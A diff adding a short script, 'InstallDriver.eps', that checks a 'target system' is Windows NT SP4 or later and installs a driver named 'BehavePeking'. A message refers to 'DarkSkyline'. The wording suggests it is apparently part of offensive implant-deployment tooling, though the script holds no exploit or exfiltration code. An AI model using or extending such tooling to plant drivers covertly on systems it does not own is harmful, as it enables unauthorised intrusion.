@@ -1,0 +1,44 @@
+#--------------------------------------------------------
+# File: InstallDriver.eps
+#
+# Wrapper script for Install of BehavePeking driver
+#
+# Modifications:
+#  29 Aug 2005	Created.
+#--------------------------------------------------------
+@include "_DriverIncludes.epm";
+@include "_GetSystemVersion.epm";
+
+@echo off;
+
+if ($argc != 2) {
+    echo "Usage: $argv[0] <driverName>";
+    return false;
+}
+
+string $driver = $argv[1];
+
+# check to make sure we're NT 4 Sp4 or higher
+int $majorVersion;
+int $minorVersion;
+int $buildNumber;
+int $platformId;
+int $spMajorVersion;
+int $spMinorVersion;
+ifnot (_GetSystemVersion($majorVersion, $minorVersion, $buildNumber, $platformId, $spMajorVersion, $spMinorVersion)) {
+    echo "Unable to get system version -- manually verify that";
+    echo "the target system is Windows NT Sp4 or greater";
+    pause;
+} else if (($majorVersion == 4) && ($spMajorVersion < 4)) {
+    # NT 4 Service pack 3 or less
+    echo "*** Target system is pre-NT Sp4. ***";
+    echo "    DarkSkyline is not compatible with this system";
+    return false;
+}
+
+ifnot (_DriverInstall($driver, "BehavePeking", 2, 1)) {
+    return false;
+}
+
+# we're done...
+return true;
